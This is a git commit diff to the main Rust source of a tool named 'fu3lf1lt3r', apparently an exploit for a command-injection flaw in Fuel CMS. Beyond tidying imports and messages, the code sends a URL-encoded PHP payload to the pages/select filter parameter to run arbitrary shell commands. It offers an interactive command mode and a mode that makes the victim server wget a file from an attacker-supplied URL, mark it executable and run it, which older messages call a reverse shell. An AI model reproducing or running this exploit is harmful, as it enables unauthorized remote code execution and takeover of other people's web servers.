1e27a4cf4bd482334cc0b443e3c39416a99465e6
Skye Viau <skye.viau@outlook.com>
2020-06-22 22:11:54 -0400

    Clean up imports and add better error messages

--- src/main.rs
+++ src/main.rs
@@ -1,10 +1,12 @@
-use colored::*;
-use crate::cool_text::load_title;
-use clap::crate_version;
-use text_io::read;
 use std::env;
 use std::process::exit;
+
+use clap::crate_version;
+use colored::*;
+use text_io::read;
 use urlencoding::encode;
+
+use crate::cool_text::load_title;
 
 mod color_macro;
 mod cool_text;
@@ -18,18 +20,20 @@ async fn main() {
 
     match args.len() {
         1 => {
-            error_out!("Please add a URL to attack!");
+            error_out!("Please add a target to attack!");
+            regular_out!("Syntax: fu3lf1lt3r <target> [file url]");
+            regular_out!("Adding a file url will launch a malicious file attack.");
             exit(1);
-        },
+        }
         2 => {
             regular_out!(format!("Attacking {}!", args[1]));
 
-            // Check if we get a response from getting the URL
-            warning_out!("Checking if URL is vaild...");
+            // Check if we get a response from GETing the target
+            warning_out!("Checking if target is vaild...");
             if reqwest::get(&format!("{}/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27{}%27%29%2b%27", args[1], "ls")).await.unwrap().status() == 200 {
                 okay_out!("Target vulnerable... Continuing with attack...")
             } else {
-                error_out!("UNABLE TO ATTACK TARGET");
+                error_out!("Target not vulnerable! Stopping attack!");
                 exit(1);
             }
 
@@ -38,43 +42,48 @@ async fn main() {
                 let input: String = read!("{}\n");
                 println!("{}", find_output(args[1].clone(), input).await);
             }
-        },
+        }
         3 => {
             regular_out!("Selecting malicious file attack...");
             regular_out!(format!("Setting {} as malicious file address...", args[2]));
             regular_out!(format!("Attacking {}!", args[1]));
 
-            // Check if we get a response from getting the URL
-            warning_out!("Checking if URL is vaild...");
+            // Check if we get a response from GETing the target
+            warning_out!("Checking if target is vaild...");
             if reqwest::get(&format!("{}/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27{}%27%29%2b%27", args[1], "ls")).await.unwrap().status() == 200 {
                 okay_out!("Target vulnerable... Continuing with attack...")
             } else {
-                error_out!("UNABLE TO ATTACK TARGET");
+                error_out!("Target not vulnerable! Stopping attack!");
                 exit(1);
             }
 
-            regular_out!(format!("Downloading file..."));
+            regular_out!(format!("Downloading malicious file..."));
             reqwest::get(&format!("{}/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27{}%27%29%2b%27", args[1], encode(r##"rm malfile"##))).await.ok();
             let resp_down = reqwest::get(&format!("{}/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27{}%27%29%2b%27", args[1], encode(&format!(r##"wget -O malfile {}"##, args[2])))).await;
             if resp_down.unwrap().status() == 200 {
-                okay_out!("Reverse shell downloaded!");
+                okay_out!("Malicious file downloaded!");
             } else {
-                error_out!("Reverse shell failed to download!");
+                error_out!("Malicious file failed to download!");
                 exit(1);
             }
 
-            regular_out!(format!("Running file..."));
+            regular_out!(format!("Running malicious file..."));
             reqwest::get(&format!("{}/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27{}%27%29%2b%27", args[1], encode(r##"chmod +x malfile"##))).await.ok();
             let resp_run = reqwest::get(&format!("{}/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27{}%27%29%2b%27", args[1], encode(r##"./malfile"##))).await;
             if resp_run.unwrap().status() == 200 {
-                okay_out!("File ran!");
+                okay_out!("Malicious file ran and closed!");
                 exit(0);
             } else {
-                error_out!("File failed to run!");
+                error_out!("Malicious file failed to run!");
                 exit(1);
             }
         }
-        _ => {}
+        _ => {
+            error_out!("Too many arguments!");
+            regular_out!("Syntax: fu3lf1lt3r <target> [file url]");
+            regular_out!("Adding a file url will launch a malicious file attack.");
+            exit(1);
+        }
     }
 }
 
